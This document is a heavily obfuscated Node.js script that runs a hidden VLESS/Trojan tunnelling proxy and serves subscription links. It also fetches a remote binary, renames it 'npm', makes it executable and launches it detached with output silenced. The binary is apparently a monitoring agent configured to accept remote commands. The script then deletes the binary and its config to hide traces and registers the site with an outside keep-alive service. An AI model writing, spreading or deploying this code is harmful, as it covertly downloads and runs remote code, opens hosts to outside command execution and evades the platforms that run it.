const _0x14f5b0=_0x1871;(function(_0xb2058d,_0x116ea0){const _0x58def2=_0x1871,_0x3c4f65=_0xb2058d();while(!![]){try{const _0x5d7b02=parseInt(_0x58def2(0x240))/0x1*(-parseInt(_0x58def2(0x202))/0x2)+parseInt(_0x58def2(0x21c))/0x3*(parseInt(_0x58def2(0x20e))/0x4)+parseInt(_0x58def2(0x253))/0x5*(parseInt(_0x58def2(0x211))/0x6)+-parseInt(_0x58def2(0x244))/0x7*(parseInt(_0x58def2(0x1f9))/0x8)+parseInt(_0x58def2(0x236))/0x9*(-parseInt(_0x58def2(0x248))/0xa)+-parseInt(_0x58def2(0x20c))/0xb*(parseInt(_0x58def2(0x256))/0xc)+parseInt(_0x58def2(0x1fd))/0xd*(parseInt(_0x58def2(0x26c))/0xe);if(_0x5d7b02===_0x116ea0)break;else _0x3c4f65['push'](_0x3c4f65['shift']());}catch(_0x581346){_0x3c4f65['push'](_0x3c4f65['shift']());}}}(_0x3ce3,0xdee66));const os=require('os'),http=require(_0x14f5b0(0x21e)),fs=require('fs'),axios=require(_0x14f5b0(0x215)),net=require(_0x14f5b0(0x230)),path=require(_0x14f5b0(0x225)),crypto=require(_0x14f5b0(0x24f)),{Buffer}=require(_0x14f5b0(0x20d)),{exec,execSync}=require(_0x14f5b0(0x251)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x14f5b0(0x245)]['UUID']||_0x14f5b0(0x1ef),NEZHA_SERVER=process['env'][_0x14f5b0(0x210)]||'',NEZHA_PORT=process['env'][_0x14f5b0(0x242)]||'',NEZHA_KEY=process['env'][_0x14f5b0(0x255)]||'',DOMAIN=process[_0x14f5b0(0x245)][_0x14f5b0(0x23a)]||_0x14f5b0(0x26f),AUTO_ACCESS=process[_0x14f5b0(0x245)][_0x14f5b0(0x26a)]||![],WSPATH=process['env']['WSPATH']||UUID[_0x14f5b0(0x20b)](0x0,0x8),SUB_PATH=process[_0x14f5b0(0x245)][_0x14f5b0(0x241)]||_0x14f5b0(0x218),NAME=process[_0x14f5b0(0x245)][_0x14f5b0(0x26b)]||'',PORT=process[_0x14f5b0(0x245)][_0x14f5b0(0x268)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x4aa4fa=_0x14f5b0;try{const _0x5c02ba=await axios[_0x4aa4fa(0x214)]('https://speed.cloudflare.com/meta'),_0x196b35=_0x5c02ba[_0x4aa4fa(0x1f2)];ISP=(_0x196b35['country']+'-'+_0x196b35[_0x4aa4fa(0x25a)])[_0x4aa4fa(0x24b)](/ /g,'_');}catch(_0x3fbbbf){ISP=_0x4aa4fa(0x26e);}};GetISP();const httpServer=http[_0x14f5b0(0x212)]((_0x290802,_0x2a087b)=>{const _0x53a53b=_0x14f5b0;if(_0x290802[_0x53a53b(0x1fe)]==='/'){const _0x55c3a8=path[_0x53a53b(0x21a)](__dirname,_0x53a53b(0x1fa));fs['readFile'](_0x55c3a8,_0x53a53b(0x258),(_0x1bfd13,_0x2b08bd)=>{const _0x1e346b=_0x53a53b;if(_0x1bfd13){_0x2a087b[_0x1e346b(0x21d)](0xc8,{'Content-Type':_0x1e346b(0x243)}),_0x2a087b[_0x1e346b(0x252)]('Hello\x20world!');return;}_0x2a087b['writeHead'](0xc8,{'Content-Type':_0x1e346b(0x243)}),_0x2a087b[_0x1e346b(0x252)](_0x2b08bd);});return;}else{if(_0x290802['url']==='/'+SUB_PATH){const _0x43ab73=NAME?NAME+'-'+ISP:ISP,_0x3af933='vless://'+UUID+_0x53a53b(0x200)+DOMAIN+_0x53a53b(0x206)+DOMAIN+_0x53a53b(0x24d)+WSPATH+'#'+_0x43ab73,_0x47691c='trojan://'+UUID+_0x53a53b(0x216)+DOMAIN+_0x53a53b(0x206)+DOMAIN+_0x53a53b(0x24d)+WSPATH+'#'+_0x43ab73,_0x730da2=_0x3af933+'\x0a'+_0x47691c,_0x52937c=Buffer[_0x53a53b(0x20a)](_0x730da2)['toString'](_0x53a53b(0x233));_0x2a087b[_0x53a53b(0x21d)](0xc8,{'Content-Type':'text/plain'}),_0x2a087b['end'](_0x52937c+'\x0a');}else _0x2a087b['writeHead'](0x194,{'Content-Type':_0x53a53b(0x267)}),_0x2a087b[_0x53a53b(0x252)](_0x53a53b(0x22d));}}),wss=new WebSocket[(_0x14f5b0(0x257))]({'server':httpServer}),uuid=UUID[_0x14f5b0(0x24b)](/-/g,''),DNS_SERVERS=[_0x14f5b0(0x234),'1.1.1.1'];function resolveHost(_0x529122){return new Promise((_0x885fce,_0xd0fe93)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x529122)){_0x885fce(_0x529122);return;}let _0x391dc3=0x0;function _0xd9d2f6(){const _0x4126f9=_0x1871;if(_0x391dc3>=DNS_SERVERS[_0x4126f9(0x254)]){_0xd0fe93(new Error('Failed\x20to\x20resolve\x20'+_0x529122+_0x4126f9(0x224)));return;}const _0x2bdaad=DNS_SERVERS[_0x391dc3];_0x391dc3++;const _0x35c287=_0x4126f9(0x223)+encodeURIComponent(_0x529122)+_0x4126f9(0x232);axios[_0x4126f9(0x214)](_0x35c287,{'timeout':0x1388,'headers':{'Accept':_0x4126f9(0x25c)}})['then'](_0x2b404f=>{const _0x30831e=_0x4126f9,_0x4e164d=_0x2b404f[_0x30831e(0x1f2)];if(_0x4e164d[_0x30831e(0x1f1)]===0x0&&_0x4e164d['Answer']&&_0x4e164d['Answer'][_0x30831e(0x254)]>0x0){const _0x31fc98=_0x4e164d[_0x30831e(0x24e)]['find'](_0x2b9383=>_0x2b9383[_0x30831e(0x266)]===0x1);if(_0x31fc98){_0x885fce(_0x31fc98[_0x30831e(0x1f2)]);return;}}_0xd9d2f6();})['catch'](_0x54fdc1=>{_0xd9d2f6();});}_0xd9d2f6();});}function handleVlessConnection(_0x5c1a24,_0x519ea2){const _0x4b2189=_0x14f5b0,[_0x3a73c6]=_0x519ea2,_0x581dae=_0x519ea2['slice'](0x1,0x11);if(!_0x581dae['every']((_0x50656e,_0x560109)=>_0x50656e==parseInt(uuid['substr'](_0x560109*0x2,0x2),0x10)))return![];let _0x13c6da=_0x519ea2[_0x4b2189(0x20b)](0x11,0x12)['readUInt8']()+0x13;const _0x382dc8=_0x519ea2[_0x4b2189(0x20b)](_0x13c6da,_0x13c6da+=0x2)[_0x4b2189(0x247)](0x0),_0x4e87e7=_0x519ea2[_0x4b2189(0x20b)](_0x13c6da,_0x13c6da+=0x1)[_0x4b2189(0x259)](),_0x4decae=_0x4e87e7==0x1?_0x519ea2[_0x4b2189(0x20b)](_0x13c6da,_0x13c6da+=0x4)['join']('.'):_0x4e87e7==0x2?new TextDecoder()[_0x4b2189(0x1f6)](_0x519ea2[_0x4b2189(0x20b)](_0x13c6da+0x1,_0x13c6da+=0x1+_0x519ea2['slice'](_0x13c6da,_0x13c6da+0x1)[_0x4b2189(0x259)]())):_0x4e87e7==0x3?_0x519ea2['slice'](_0x13c6da,_0x13c6da+=0x10)['reduce']((_0x4b9dce,_0x56520f,_0x1442d7,_0x4d83fc)=>_0x1442d7%0x2?_0x4b9dce[_0x4b2189(0x271)](_0x4d83fc['slice'](_0x1442d7-0x1,_0x1442d7+0x1)):_0x4b9dce,[])[_0x4b2189(0x25d)](_0x718f54=>_0x718f54[_0x4b2189(0x247)](0x0)[_0x4b2189(0x207)](0x10))[_0x4b2189(0x21a)](':'):'';_0x5c1a24['send'](new Uint8Array([_0x3a73c6,0x0]));const _0x14830d=createWebSocketStream(_0x5c1a24);return resolveHost(_0x4decae)[_0x4b2189(0x260)](_0x4fb8e0=>{const _0x2fa5fb=_0x4b2189;net['connect']({'host':_0x4fb8e0,'port':_0x382dc8},function(){const _0x15e739=_0x1871;this['write'](_0x519ea2[_0x15e739(0x20b)](_0x13c6da)),_0x14830d['on'](_0x15e739(0x1f7),()=>{})[_0x15e739(0x250)](this)['on'](_0x15e739(0x1f7),()=>{})[_0x15e739(0x250)](_0x14830d);})['on'](_0x2fa5fb(0x1f7),()=>{});})[_0x4b2189(0x22b)](_0x229757=>{const _0x5aa0dc=_0x4b2189;net[_0x5aa0dc(0x249)]({'host':_0x4decae,'port':_0x382dc8},function(){const _0x1b7c8b=_0x5aa0dc;this[_0x1b7c8b(0x1f3)](_0x519ea2[_0x1b7c8b(0x20b)](_0x13c6da)),_0x14830d['on']('error',()=>{})[_0x1b7c8b(0x250)](this)['on']('error',()=>{})[_0x1b7c8b(0x250)](_0x14830d);})['on'](_0x5aa0dc(0x1f7),()=>{});}),!![];}function handleTrojanConnection(_0x1289ec,_0x161057){const _0x2a0f5d=_0x14f5b0;try{if(_0x161057['length']<0x3a)return![];const _0x2269ea=_0x161057['slice'](0x0,0x38)['toString'](),_0xb2df13=[UUID];let _0x3956fd=null;for(const _0x1f6150 of _0xb2df13){const _0x263444=crypto['createHash'](_0x2a0f5d(0x261))[_0x2a0f5d(0x228)](_0x1f6150)[_0x2a0f5d(0x23d)](_0x2a0f5d(0x1f0));if(_0x263444===_0x2269ea){_0x3956fd=_0x1f6150;break;}}if(!_0x3956fd)return![];let _0x4e022a=0x38;_0x161057[_0x4e022a]===0xd&&_0x161057[_0x4e022a+0x1]===0xa&&(_0x4e022a+=0x2);const _0x382db9=_0x161057[_0x4e022a];if(_0x382db9!==0x1)return![];_0x4e022a+=0x1;const _0x612ee6=_0x161057[_0x4e022a];_0x4e022a+=0x1;let _0x30fe40,_0x7fccf9;if(_0x612ee6===0x1)_0x30fe40=_0x161057[_0x2a0f5d(0x20b)](_0x4e022a,_0x4e022a+0x4)[_0x2a0f5d(0x21a)]('.'),_0x4e022a+=0x4;else{if(_0x612ee6===0x3){const _0x4c5fb2=_0x161057[_0x4e022a];_0x4e022a+=0x1,_0x30fe40=_0x161057[_0x2a0f5d(0x20b)](_0x4e022a,_0x4e022a+_0x4c5fb2)[_0x2a0f5d(0x207)](),_0x4e022a+=_0x4c5fb2;}else{if(_0x612ee6===0x4)_0x30fe40=_0x161057['slice'](_0x4e022a,_0x4e022a+0x10)[_0x2a0f5d(0x209)]((_0x54e7d4,_0x3473be,_0xa30b63,_0x4a5041)=>_0xa30b63%0x2?_0x54e7d4['concat'](_0x4a5041[_0x2a0f5d(0x20b)](_0xa30b63-0x1,_0xa30b63+0x1)):_0x54e7d4,[])['map'](_0x2ea062=>_0x2ea062[_0x2a0f5d(0x247)](0x0)[_0x2a0f5d(0x207)](0x10))[_0x2a0f5d(0x21a)](':'),_0x4e022a+=0x10;else return![];}}_0x7fccf9=_0x161057['readUInt16BE'](_0x4e022a),_0x4e022a+=0x2;_0x4e022a<_0x161057[_0x2a0f5d(0x254)]&&_0x161057[_0x4e022a]===0xd&&_0x161057[_0x4e022a+0x1]===0xa&&(_0x4e022a+=0x2);const _0xa1f183=createWebSocketStream(_0x1289ec);return resolveHost(_0x30fe40)[_0x2a0f5d(0x260)](_0x1e37df=>{net['connect']({'host':_0x1e37df,'port':_0x7fccf9},function(){const _0x2db798=_0x1871;_0x4e022a<_0x161057[_0x2db798(0x254)]&&this['write'](_0x161057[_0x2db798(0x20b)](_0x4e022a)),_0xa1f183['on']('error',()=>{})[_0x2db798(0x250)](this)['on'](_0x2db798(0x1f7),()=>{})[_0x2db798(0x250)](_0xa1f183);})['on']('error',()=>{});})[_0x2a0f5d(0x22b)](_0x6340b1=>{const _0x4c0b76=_0x2a0f5d;net[_0x4c0b76(0x249)]({'host':_0x30fe40,'port':_0x7fccf9},function(){const _0x5510b4=_0x4c0b76;_0x4e022a<_0x161057[_0x5510b4(0x254)]&&this[_0x5510b4(0x1f3)](_0x161057[_0x5510b4(0x20b)](_0x4e022a)),_0xa1f183['on']('error',()=>{})[_0x5510b4(0x250)](this)['on'](_0x5510b4(0x1f7),()=>{})[_0x5510b4(0x250)](_0xa1f183);})['on']('error',()=>{});}),!![];}catch(_0x15dc28){return![];}}function _0x3ce3(){const _0x5b12ed=['2053','createWriteStream','then','sha224','npm\x20is\x20already\x20running,\x20skip\x20running...','substr','every','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','type','text/plain','PORT','arm','AUTO_ACCESS','NAME','3899406VwYGCJ','once','Unknown','1234.abc.com','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','concat','5efabea4-f6d4-91fd-b8f0-17e004c89c60','hex','Status','data','write','https://arm64.ssss.nyc.mn/v1','client_secret:\x20','decode','error','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','224144wDVNWW','index.html','https://','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','52NjHKLm','url','npm\x20running\x20error:','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','https://amd64.ssss.nyc.mn/agent','1638354NefyFF','setsid\x20nohup\x20./npm\x20-s\x20','connection','config.yaml','&fp=chrome&type=ws&host=','toString','utf-8','reduce','from','slice','1199YjkFYz','buffer','500eqEBeN','--tls','NEZHA_SERVER','36jayJMU','createServer','unlink','get','axios','@cdns.doon.eu.org:443?security=tls&sni=','\x20-p\x20','sub','aarch64','join','/bin/bash','10239AAquqx','writeHead','http','trim','finish','stream','8443','https://dns.google/resolve?name=','\x20with\x20all\x20DNS\x20servers','path','2083','npm','update','2087','includes','catch','true','Not\x20Found\x0a','arm64','split','net','https://oooo.serv00.net/add-url','&type=A','base64','8.8.4.4','close','18oPwTTy','arch','listen','log','DOMAIN','https://arm64.ssss.nyc.mn/agent','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','digest','false','application/json','2tfbrFw','SUB_PATH','NEZHA_PORT','text/html','77mrYRSG','env','post','readUInt16BE','1345460Tpbqpl','connect','chmod\x20+x\x20npm','replace','Automatic\x20Access\x20Task\x20added\x20successfully','&path=%2F','Answer','crypto','pipe','child_process','end','1451235eqWQWf','length','NEZHA_KEY','16908myZAHP','Server','utf8','readUInt8','asOrganization','npm\x20is\x20running','application/dns-json','map'];_0x3ce3=function(){return _0x5b12ed;};return _0x3ce3();}wss['on'](_0x14f5b0(0x204),(_0x331c09,_0x4e5de4)=>{const _0x387014=_0x14f5b0,_0x48a7b4=_0x4e5de4[_0x387014(0x1fe)]||'';_0x331c09[_0x387014(0x26d)]('message',_0x508299=>{const _0x1fea65=_0x387014;if(_0x508299[_0x1fea65(0x254)]>0x11&&_0x508299[0x0]===0x0){const _0x3207bb=_0x508299[_0x1fea65(0x20b)](0x1,0x11),_0x26e75b=_0x3207bb[_0x1fea65(0x264)]((_0x5c6879,_0x2f7997)=>_0x5c6879==parseInt(uuid[_0x1fea65(0x263)](_0x2f7997*0x2,0x2),0x10));if(_0x26e75b){!handleVlessConnection(_0x331c09,_0x508299)&&_0x331c09[_0x1fea65(0x235)]();return;}}!handleTrojanConnection(_0x331c09,_0x508299)&&_0x331c09[_0x1fea65(0x235)]();})['on']('error',()=>{});});function _0x1871(_0xdbeee1,_0x3379a7){const _0x3ce37e=_0x3ce3();return _0x1871=function(_0x1871c2,_0x124227){_0x1871c2=_0x1871c2-0x1ef;let _0x191cde=_0x3ce37e[_0x1871c2];return _0x191cde;},_0x1871(_0xdbeee1,_0x3379a7);}const getDownloadUrl=()=>{const _0x33f94f=_0x14f5b0,_0x2caf2c=os[_0x33f94f(0x237)]();return _0x2caf2c===_0x33f94f(0x269)||_0x2caf2c===_0x33f94f(0x22e)||_0x2caf2c===_0x33f94f(0x219)?!NEZHA_PORT?_0x33f94f(0x1f4):_0x33f94f(0x23b):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x33f94f(0x201);},downloadFile=async()=>{const _0x3fd833=_0x14f5b0;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x5b97e6=getDownloadUrl(),_0x4407b3=await axios({'method':_0x3fd833(0x214),'url':_0x5b97e6,'responseType':_0x3fd833(0x221)}),_0x589b40=fs[_0x3fd833(0x25f)]('npm');return _0x4407b3[_0x3fd833(0x1f2)][_0x3fd833(0x250)](_0x589b40),new Promise((_0x36da32,_0x1f7267)=>{const _0x5b6356=_0x3fd833;_0x589b40['on'](_0x5b6356(0x220),()=>{const _0x5a7015=_0x5b6356;console[_0x5a7015(0x239)]('npm\x20download\x20successfully'),exec(_0x5a7015(0x24a),_0xe44ab8=>{if(_0xe44ab8)_0x1f7267(_0xe44ab8);_0x36da32();});}),_0x589b40['on'](_0x5b6356(0x1f7),_0x1f7267);});}catch(_0x3bb3cb){throw _0x3bb3cb;}},runnz=async()=>{const _0x3bc152=_0x14f5b0;try{const _0xfcaa85=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x3bc152(0x208)});if(_0xfcaa85[_0x3bc152(0x21f)]()!==''){console[_0x3bc152(0x239)](_0x3bc152(0x262));return;}}catch(_0x15d456){}await downloadFile();let _0x4e2e3d='',_0x3ef5dd=['443',_0x3bc152(0x222),'2096',_0x3bc152(0x229),_0x3bc152(0x226),_0x3bc152(0x25e)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x2563dc=_0x3ef5dd[_0x3bc152(0x22a)](NEZHA_PORT)?_0x3bc152(0x20f):'';_0x4e2e3d=_0x3bc152(0x203)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3bc152(0x217)+NEZHA_KEY+'\x20'+_0x2563dc+_0x3bc152(0x23c);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3d7332=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x3bc152(0x22f)](':')['pop']():'',_0x464317=_0x3ef5dd[_0x3bc152(0x22a)](_0x3d7332)?_0x3bc152(0x22c):_0x3bc152(0x23e),_0xe6c191=_0x3bc152(0x1f5)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x3bc152(0x265)+_0x464317+_0x3bc152(0x1f8)+UUID;fs['writeFileSync']('config.yaml',_0xe6c191);}_0x4e2e3d=_0x3bc152(0x1fc);}else{console[_0x3bc152(0x239)](_0x3bc152(0x270));return;}}try{exec(_0x4e2e3d,{'shell':_0x3bc152(0x21b)},_0x315f9d=>{const _0x47a6c4=_0x3bc152;if(_0x315f9d)console[_0x47a6c4(0x1f7)](_0x47a6c4(0x1ff),_0x315f9d);else console['log'](_0x47a6c4(0x25b));});}catch(_0x5d40b3){console[_0x3bc152(0x1f7)]('error:\x20'+_0x5d40b3);}};async function addAccessTask(){const _0x2b7620=_0x14f5b0;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x214000=_0x2b7620(0x1fb)+DOMAIN+'/'+SUB_PATH;try{const _0x241096=await axios[_0x2b7620(0x246)](_0x2b7620(0x231),{'url':_0x214000},{'headers':{'Content-Type':_0x2b7620(0x23f)}});console[_0x2b7620(0x239)](_0x2b7620(0x24c));}catch(_0x285b32){}}const delFiles=()=>{const _0x33f86e=_0x14f5b0;fs['unlink'](_0x33f86e(0x227),()=>{}),fs[_0x33f86e(0x213)](_0x33f86e(0x205),()=>{});};httpServer[_0x14f5b0(0x238)](PORT,()=>{const _0x5b55c8=_0x14f5b0;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x5b55c8(0x239)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
